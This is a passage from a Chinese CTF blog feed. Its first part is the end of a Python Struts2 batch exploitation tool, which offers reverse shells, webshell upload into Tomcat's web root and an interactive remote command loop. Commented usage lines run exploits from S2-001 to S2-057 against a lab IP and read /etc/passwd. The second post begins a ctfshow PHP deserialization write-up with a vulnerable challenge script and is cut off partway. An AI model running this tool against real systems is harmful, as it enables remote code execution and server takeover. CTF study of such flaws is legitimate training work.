class="params"><span class="string">&#x27;--webpath&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;获取WEB路径&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-r&#x27;</span>, <span class="string">&#x27;--reverse&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;反弹shell地址, 格式为ip:port&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--upfile&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;需要上传的文件路径和名称&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;--uppath&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;上传的目录和名称, 如: /usr/local/tomcat/webapps/ROOT/shell.jsp&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@click.option(<span class="params"><span class="string">&#x27;-q&#x27;</span>, <span class="string">&#x27;--quiet&#x27;</span>, is_flag=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&quot;关闭打印不存在漏洞的输出，只保留存在漏洞的输出&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">info, version, url, file, name, data, header, encode, proxy, <span class="built_in">exec</span>, reverse, upfile, uppath, quiet, timeout,</span></span></span><br><span class="line"><span class="function"><span class="params">         workers, webpath</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Struts2批量扫描利用工具&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">global</span> proxies, is_quiet, _tiemout, process</span><br><span class="line">    click.secho(banner, fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> encode:</span><br><span class="line">        encode = <span class="string">&#x27;UTF-8&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> info:</span><br><span class="line">        show_info()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> version:</span><br><span class="line">        click.secho(<span class="string">&quot;[+] Struts2 Scan V0.1&quot;</span>, fg=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> proxy:</span><br><span class="line">        proxies = &#123;</span><br><span class="line">            <span class="string">&quot;http&quot;</span>: proxy,</span><br><span class="line">            <span class="string">&quot;https&quot;</span>: proxy</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span> quiet:</span><br><span class="line">        is_quiet = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> timeout <span class="keyword">and</span> check_int(<span class="string">&#x27;timeout&#x27;</span>, timeout):</span><br><span class="line">        _tiemout = check_int(<span class="string">&#x27;timeout&#x27;</span>, timeout)</span><br><span class="line">    <span class="keyword">if</span> workers <span class="keyword">and</span> check_int(<span class="string">&#x27;workers&#x27;</span>, workers):</span><br><span class="line">        process = check_int(<span class="string">&#x27;workers&#x27;</span>, workers)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">and</span> <span class="keyword">not</span> name:</span><br><span class="line">        scan_one(url, data, header, encode)</span><br><span class="line">    <span class="keyword">if</span> file:</span><br><span class="line">        urls = read_urls(file)</span><br><span class="line">        scan_more(urls, data, header, encode)</span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">and</span> url:</span><br><span class="line">        <span class="comment"># 指定漏洞利用</span></span><br><span class="line">        name = name.upper().replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> s2_list:</span><br><span class="line">            click.secho(<span class="string">&quot;[ERROR] 暂不支持&#123;name&#125;漏洞利用&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">        s = s2_dict[name](url, data, header, encode)</span><br><span class="line">        s.check()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s.is_vul:</span><br><span class="line">            click.secho(<span class="string">&quot;[ERROR] 该URL不存在&#123;name&#125;漏洞&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> webpath:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">in</span> webpath_names:</span><br><span class="line">                web_path = s.get_path()</span><br><span class="line">                click.secho(<span class="string">&quot;[*] &#123;webpath&#125;&quot;</span>.<span class="built_in">format</span>(webpath=web_path), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                click.secho(<span class="string">&quot;[ERROR] 漏洞&#123;name&#125;不支持获取WEB路径&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> reverse:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">in</span> reverse_names:</span><br><span class="line">                click.secho(<span class="string">&quot;[*] 请在反弹地址处监听端口如: nc -lvvp 8080&quot;</span>, fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;:&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> reverse:</span><br><span class="line">                    click.secho(<span class="string">&quot;[ERROR] reverse反弹地址格式不对,正确格式为: 192.168.1.10:8080&quot;</span>, fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                ip = reverse.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>].strip()</span><br><span class="line">                port = reverse.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">                s.reverse_shell(ip, port)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                click.secho(<span class="string">&quot;[ERROR] 漏洞&#123;name&#125;不支持反弹shell&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> upfile <span class="keyword">and</span> uppath:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">in</span> upload_names <span class="keyword">and</span> check_file(upfile):</span><br><span class="line">                result = s.upload_shell(uppath, upfile)</span><br><span class="line">                <span class="keyword">if</span> result <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                    click.secho(<span class="string">&quot;[+] 文件上传成功!&quot;</span>, fg=<span class="string">&quot;green&quot;</span>)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> <span class="built_in">str</span>(result).startswith(<span class="string">&quot;ERROR:&quot;</span>):</span><br><span class="line">                    click.secho(<span class="string">&quot;[ERROR] 文件上传失败! &#123;error&#125;&quot;</span>.<span class="built_in">format</span>(error=result[<span class="number">6</span>:]), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    click.secho(<span class="string">&quot;[ERROR] 文件上传失败! \n&#123;error&#125;&quot;</span>.<span class="built_in">format</span>(error=result), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                click.secho(<span class="string">&quot;[ERROR] 漏洞&#123;name&#125;不支持文件上传&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">exec</span>:</span><br><span class="line">            <span class="keyword">if</span> name <span class="keyword">in</span> exec_names:</span><br><span class="line">                <span class="keyword">if</span> name == <span class="string">&quot;S2_052&quot;</span>:</span><br><span class="line">                    click.secho(<span class="string">&quot;[+] 提示: S2_052命令执行无回显，可将结果写入文件访问&quot;</span>, fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">                <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                    cmd = <span class="built_in">input</span>(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">                    result = s.exec_cmd(cmd)</span><br><span class="line">                    click.secho(result, fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                click.secho(<span class="string">&quot;[ERROR] 漏洞&#123;name&#125;不支持命令执行&quot;</span>.<span class="built_in">format</span>(name=name), fg=<span class="string">&quot;red&quot;</span>)</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">        click.secho(s.info, fg=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt <span class="keyword">as</span> e:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        click.secho(<span class="string">&quot;[ERROR] &#123;error&#125;&quot;</span>.<span class="built_in">format</span>(error=e), fg=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_001(&quot;http://192.168.100.8:8080/login.action&quot;)</span></span><br><span class="line"><span class="comment"># print(s.info)</span></span><br><span class="line"><span class="comment"># print(s.check())</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s =  S2_003(&quot;http://192.168.100.8:8080/showcase.action&quot;)</span></span><br><span class="line"><span class="comment"># print(s.check())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_005(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span></span><br><span class="line"><span class="comment"># print(s.check())</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -al&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_007(&quot;http://192.168.100.8:8080/user.action&quot;, &quot;name=admin&amp;email=admin&amp;age=&#123;exp&#125;&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_008(&quot;http://192.168.100.8:8080&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_009(&quot;http://192.168.100.8:8080/ajax/example5.action?age=123&quot;, &quot;name&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_012(&quot;http://192.168.100.8:8080/S2-012/user.action?name=&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_013(&quot;http://192.168.100.8:8080/S2-013/link.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_015(&quot;http://192.168.100.8:8080/param.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_016(&quot;http://192.168.100.8:8080/index.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd1(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># print(&#x27;---------------------&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd2(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># print(&#x27;---------------------&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd3(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># print(s.upload_shell1(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span></span><br><span class="line"><span class="comment"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_019(&quot;http://192.168.100.8:8080/example/HelloWorld.action&quot;)</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_029(&quot;http://192.168.100.8/default.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_032(&quot;http://192.168.100.8:8080/index.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_033(&quot;http://192.168.100.8/orders/3&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_037(&quot;http://192.168.100.8:8080/orders/3/&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_045(&quot;http://192.168.100.8/memoshow.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_046(&quot;http://192.168.100.8/doUpload.action&quot;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"><span class="comment"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_052(&#x27;http://192.168.100.8/orders/3/edit&#x27;)</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_053(&quot;http://192.168.100.8&quot;, data=&#x27;name=&#123;exp&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># s.check()</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_devMode(&quot;http://192.168.100.8/orders&quot;)</span></span><br><span class="line"><span class="comment"># print(s.get_path())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># s = S2_057(&quot;http://192.168.100.8:8080/showcase/actionChain1.action&quot;)</span></span><br><span class="line"><span class="comment"># print(s.check())</span></span><br><span class="line"><span class="comment"># print(s.exec_cmd(&quot;cat /etc/passwd&quot;))</span></span><br><span class="line"><span class="comment"># s.reverse_shell(&quot;192.168.100.8&quot;, 9999)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>代码附上，这是相对比较简单的python的脚本，不过有些漏洞是不行的，所以我们是可以再找找其它的一些软件！如web295就是没有S2=048漏洞的</p><!--音乐--><div style="position:abolute; bottom:100px; left:0px; width:50%"> <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1483221816&auto=1&height=66"></iframe></div> <!--动态线条背景--><script type="text/javascript"color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>]]></content>
      
      
      <categories>
          
          <category> 个人博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow反序列化</title>
      <link href="posts/caf241fc/"/>
      <url>posts/caf241fc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload（有效攻击负载）是包含在你用于一次漏洞利用（exploit）中的ShellCode中的主要功能代码</span><br><span class="line">shellcode（可提权代码） 对于一个漏洞来说，ShellCode就是一个用于某个漏洞的二进制代码框架，有了这个框架你可以在这个ShellCode中包含你需要的Payload来做一些事情</span><br><span class="line">exp (Exploit )漏洞利用，一般是个demo程序</span><br><span class="line">poc(Proof of Concept)漏洞证明，一般就是个样本 用来证明和复现</span><br><span class="line">vul：(Vulnerability) :漏洞</span><br><span class="line">Pwn：是一个黑客语法的俚语词 ，是指攻破设备或者系统</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. __sleep() &#x2F;&#x2F;在对象被序列化之前运行</span><br><span class="line">2. __wakeup() &#x2F;&#x2F;将在反序列化之后立即调用（当反序列化时变量个数与实际不符是会绕过）</span><br><span class="line">3. __construct() &#x2F;&#x2F;当对象被创建时，会触发进行初始化</span><br><span class="line">4. __destruct() &#x2F;&#x2F;对象被销毁时触发</span><br><span class="line">5. __toString()： &#x2F;&#x2F;当一个对象被当作字符串使用时触发</span><br><span class="line">6. __call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发</span><br><span class="line">7. __callStatic() &#x2F;&#x2F;在静态上下文中调用不可访问的方法时触发</span><br><span class="line">8. __get() &#x2F;&#x2F;获得一个类的成员变量时调用,用于从不可访问的属性读取数据</span><br><span class="line">9. __set() &#x2F;&#x2F;用于将数据写入不可访问的属性</span><br><span class="line">10. __isset() &#x2F;&#x2F;在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">11. __unset() &#x2F;&#x2F;在不可访问的属性上使用unset()时触发</span><br><span class="line">12. __toString() &#x2F;&#x2F;把类当作字符串使用时触发</span><br><span class="line">13. __invoke() &#x2F;&#x2F;当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>序列化对象：</p><p>private变量会被序列化为：\x00类名\x00变量名</p><p>protected变量会被序列化为: \x00*\x00变量名</p><p>public变量会被序列化为：变量名</p><p>先摘抄一波知识点！<br>然后再来进行介绍一波知识！<br><strong>数据(变量)序列化(持久化)</strong><br>将一个变量的数据“转换为”字符串，但并不是类型转换，目的是将该字符串储存在本地。相反的行为称为反序列化。<br><strong>序列化和反序列化的目的</strong>：使得程序间传输对象会更加方便<br><strong>serialize()</strong> 返回字符串，此字符串包含了表示 value 的字节流，可以存储于任何地方。</p><p>==多做题，做着做着就理解了！==</p><h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p>这道题就不解释php了，太简单了！</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><hr /><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;<span class="comment">#判断</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;<span class="comment">#全局变量</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];<span class="comment">#从这里开始看！</span></span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">#接受两个get变量</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;<span class="comment">#判断</span></span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);<span class="comment">#接受个cookie变量</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;<span class="comment">#传到本地(即上面)</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;<span class="comment">#(一个函数)</span></span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();<span class="comment">#(一个类)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以明显看到username=’xxxxxx’和password=’xxxxxx’，唯一特殊的地方就是cookie这里了！<br><img 